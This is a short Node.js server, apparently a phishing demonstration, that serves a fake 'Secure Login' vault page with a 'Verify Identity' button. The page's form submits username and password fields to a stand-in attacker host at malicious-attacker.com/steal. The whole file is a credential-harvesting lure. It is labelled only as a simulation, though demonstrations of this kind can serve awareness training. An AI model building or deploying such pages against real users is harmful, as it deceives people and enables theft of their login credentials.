const http = require('http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
    <html>
      <head><title>Secure Login</title></head>
      <body>
        <h1>Login to your Vault</h1>
        <form action="http://malicious-attacker.com/steal">
          <input type="text" placeholder="Username">
          <input type="password" placeholder="Password">
          <button type="submit">Verify Identity</button>
        </form>
      </body>
    </html>
  `);
});

server.listen(8888, () => {
  console.log('Phishing Simulation Server running at http://localhost:8888');
});
